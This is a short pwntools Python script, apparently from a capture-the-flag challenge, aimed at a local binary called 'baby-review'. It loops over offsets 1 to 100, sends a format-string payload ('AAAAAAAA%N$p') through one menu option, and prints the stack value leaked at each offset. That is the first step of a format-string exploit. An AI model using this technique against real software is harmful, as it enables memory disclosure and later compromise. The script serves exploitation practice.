#!/usr/bin/env python3
from pwn import *



elf = context.binary = ELF('./baby-review', checksec=False)
context.terminal = ['alacritty', '-e', 'zsh', '-c']



io = process(elf.path)

i = 1
while i <= 100:
    try:
        io = process(elf.path,level='error')
        io.sendlineafter(b'France?',b'Paris')
        io.sendlineafter(b'Exit',b'5')
        payload = f"AAAAAAAA%{i}$p"
        io.sendline(payload)
        io.sendlineafter(b'Exit',b'2')
        leak = io.recvlines(8)[6]
        print(f"Offset {i} has {leak}")
        i += 1
    except EOFError:
        pass
